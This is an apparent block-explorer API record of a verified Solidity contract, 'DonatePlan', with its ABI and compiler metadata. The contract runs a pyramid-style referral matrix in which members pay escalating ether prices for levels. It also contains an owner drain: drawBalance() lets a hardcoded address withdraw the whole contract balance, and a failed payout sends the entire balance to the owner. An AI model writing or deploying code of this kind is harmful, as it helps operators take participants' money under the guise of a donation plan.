{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract DonatePlan {\r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n        uint partnersCount;\r\n\r\n        mapping(uint8 => bool) activeLevels;\r\n        mapping(uint8 => Matrix) matrix;\r\n    }\r\n\r\n    struct Matrix {\r\n        address currentReferrer;\r\n        address[] referrals;\r\n        bool blocked;\r\n        uint reinvestCount;\r\n    }\r\n\r\n    uint8 public constant LAST_LEVEL = 9;\r\n\r\n    mapping(address => User) public users;\r\n    mapping(uint => address) public idToAddress;\r\n    mapping(uint => address) public userIds;\r\n    mapping(address => uint) public balances;\r\n\r\n    uint public lastUserId = 2;\r\n    address private owner;\r\n\r\n    mapping(uint8 => uint) public levelPrice;\r\n\r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 level);\r\n    event Upgrade(address indexed user, address indexed referrer, uint8 level);\r\n    event NewUserPlace(address indexed user, address indexed referrer, uint8 level, uint8 place);\r\n    event MissedEthReceive(address indexed receiver, address indexed from, uint8 level);\r\n    event SentExtraEthDividends(address indexed from, address indexed receiver, uint8 level);\r\n    event SentExtraCoinDividends(address indexed from, address indexed receiver, uint price, uint8 level);\r\n\r\n    constructor(address ownerAddress) public {\r\n        levelPrice[1] = 0.2 ether;\r\n        for (uint8 i = 2; i <= LAST_LEVEL; i++) {\r\n            levelPrice[i] = levelPrice[i-1] * 2;\r\n        }\r\n\r\n        owner = ownerAddress;\r\n\r\n        User memory user = User({\r\n            id: 1,\r\n            referrer: address(0),\r\n            partnersCount: uint(0)\r\n        });\r\n\r\n        users[ownerAddress] = user;\r\n        idToAddress[1] = ownerAddress;\r\n\r\n        for (uint8 i = 1; i <= LAST_LEVEL; i++) {\r\n            users[ownerAddress].activeLevels[i] = true;\r\n        }\r\n\r\n        userIds[1] = ownerAddress;\r\n    }\r\n    \r\n    function drawBalance() external payable {\r\n        require(msg.sender == 0xFceC9fb257eD3e4e17319B223cBef6614EAe0dbF, \"only owner\");\r\n        0xFceC9fb257eD3e4e17319B223cBef6614EAe0dbF.transfer(address(this).balance);\r\n    }\r\n\r\n    function() external payable {\r\n        if(msg.data.length == 0) {\r\n            return registration(msg.sender, owner);\r\n        }\r\n\r\n        registration(msg.sender, bytesToAddress(msg.data));\r\n    }\r\n    \r\n    function registrationExternal(address referrerAddress) external payable {\r\n        registration(msg.sender, referrerAddress);\r\n    }\r\n\r\n    function registration(address userAddress, address referrerAddress) private {\r\n        require(msg.value == levelPrice[1], \"registration cost 0.2\");\r\n        require(!isUserExists(userAddress), \" need user exists\");\r\n        require(isUserExists(referrerAddress), \" need referrer not exists\");\r\n\r\n        uint32 size;\r\n        assembly {\r\n            size := extcodesize(userAddress)\r\n        }\r\n        require(size == 0, \"cannot be a contract\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            referrer: referrerAddress,\r\n            partnersCount: 0\r\n        });\r\n\r\n        users[userAddress] = user;\r\n        idToAddress[lastUserId] = userAddress;\r\n\r\n        users[userAddress].referrer = referrerAddress;\r\n\r\n        users[userAddress].activeLevels[1] = true;\r\n\r\n        userIds[lastUserId] = userAddress;\r\n        lastUserId++;\r\n\r\n        users[referrerAddress].partnersCount++;\r\n\r\n        address freeReferrer = findFreeReferrer(userAddress, 1);\r\n        users[userAddress].matrix[1].currentReferrer = freeReferrer;\r\n        updateReferrer(userAddress, freeReferrer, 1);\r\n        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);\r\n    }\r\n\r\n    function buyNewLevel(uint8 level) external payable {\r\n        require(isUserExists(msg.sender), \"user is not exists. Register first.\");\r\n        require(msg.value == levelPrice[level], \"invalid price\");\r\n        require(level > 1 && level <= LAST_LEVEL, \"invalid level\");\r\n\r\n        require(users[msg.sender].activeLevels[level-1], \"buy previous level first\");\r\n        require(!users[msg.sender].activeLevels[level], \"level already activated\");\r\n\r\n        if (users[msg.sender].matrix[level-1].blocked) {\r\n            users[msg.sender].matrix[level-1].blocked = false;\r\n        }\r\n\r\n        address freeReferrer = findFreeReferrer(msg.sender, level);\r\n        users[msg.sender].matrix[level].currentReferrer = freeReferrer;\r\n        users[msg.sender].activeLevels[level] = true;\r\n        updateReferrer(msg.sender, freeReferrer, level);\r\n\r\n        emit Upgrade(msg.sender, freeReferrer, level);\r\n    }\r\n\r\n    function updateReferrer(address userAddress, address referrerAddress, uint8 level) private {\r\n        users[referrerAddress].matrix[level].referrals.push(userAddress);\r\n\r\n        if (users[referrerAddress].matrix[level].referrals.length < 5) {\r\n            emit NewUserPlace(userAddress, referrerAddress, level, uint8(users[referrerAddress].matrix[level].referrals.length));\r\n            return sendETHDividends(referrerAddress, userAddress, level);\r\n        }\r\n\r\n        emit NewUserPlace(userAddress, referrerAddress, level, 5);\r\n        users[referrerAddress].matrix[level].referrals = new address[](0);\r\n        if (!users[referrerAddress].activeLevels[level+1] && level != LAST_LEVEL) {\r\n            users[referrerAddress].matrix[level].blocked = true;\r\n        }\r\n\r\n        if (referrerAddress != owner) {\r\n            address freeReferrerAddress = findFreeReferrer(referrerAddress, level);\r\n            if (users[referrerAddress].matrix[level].currentReferrer != freeReferrerAddress) {\r\n                users[referrerAddress].matrix[level].currentReferrer = freeReferrerAddress;\r\n            }\r\n\r\n            users[referrerAddress].matrix[level].reinvestCount++;\r\n            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, level);\r\n            updateReferrer(referrerAddress, freeReferrerAddress, level);\r\n        } else {\r\n            sendETHDividends(owner, userAddress, level);\r\n            users[owner].matrix[level].reinvestCount++;\r\n            emit Reinvest(owner, address(0), userAddress, level);\r\n        }\r\n    }\r\n\r\n    function findFreeReferrer(address userAddress, uint8 level) public view returns(address) {\r\n        while (true) {\r\n            if (users[users[userAddress].referrer].activeLevels[level]) {\r\n                return users[userAddress].referrer;\r\n            }\r\n\r\n            userAddress = users[userAddress].referrer;\r\n        }\r\n    }\r\n\r\n    function usersactiveLevels(address userAddress, uint8 level) public view returns(bool) {\r\n        return users[userAddress].activeLevels[level];\r\n    }\r\n\r\n    function usersMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool) {\r\n        return (users[userAddress].matrix[level].currentReferrer,\r\n                users[userAddress].matrix[level].referrals,\r\n                users[userAddress].matrix[level].blocked);\r\n    }\r\n\r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n\r\n    function findEthReceiver(address userAddress, address _from, uint8 level) private returns(address, bool) {\r\n        address receiver = userAddress;\r\n        bool isExtraDividends;\r\n        while (true) {\r\n            if (users[receiver].matrix[level].blocked) {\r\n                emit MissedEthReceive(receiver, _from, level);\r\n                isExtraDividends = true;\r\n                receiver = users[receiver].matrix[level].currentReferrer;\r\n            } else {\r\n                return (receiver, isExtraDividends);\r\n            }\r\n        }\r\n    }\r\n\r\n    function sendETHDividends(address userAddress, address _from, uint8 level) private {\r\n        (address receiver, bool isExtraDividends) = findEthReceiver(userAddress, _from, level);\r\n\r\n        uint upPrice = levelPrice[level] / 2;\r\n        if (!address(uint160(receiver)).send(upPrice)) {\r\n            address(uint160(owner)).transfer(address(this).balance);\r\n            return;\r\n        }\r\n\r\n        if (isExtraDividends) {\r\n            emit SentExtraEthDividends(_from, receiver, level);\r\n        }\r\n    }\r\n\r\n    function bytesToAddress(bytes memory bys) private pure returns (address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }   \r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ownerAddress\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"MissedEthReceive\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"place\",\"type\":\"uint8\"}],\"name\":\"NewUserPlace\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"currentReferrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"caller\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Reinvest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"SentExtraCoinDividends\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"SentExtraEthDividends\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":true,\"inputs\":[],\"name\":\"LAST_LEVEL\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"buyNewLevel\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"drawBalance\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"findFreeReferrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"idToAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"levelPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"}],\"name\":\"registrationExternal\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"userIds\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"partnersCount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersMatrix\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"usersactiveLevels\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}]","ContractName":"DonatePlan","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"000000000000000000000000fcec9fb257ed3e4e17319b223cbef6614eae0dbf","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://5ffab21f6895a838833d3dc463f6ec304be2c2a271999cd3e39f5b86b0bd9b20"}]}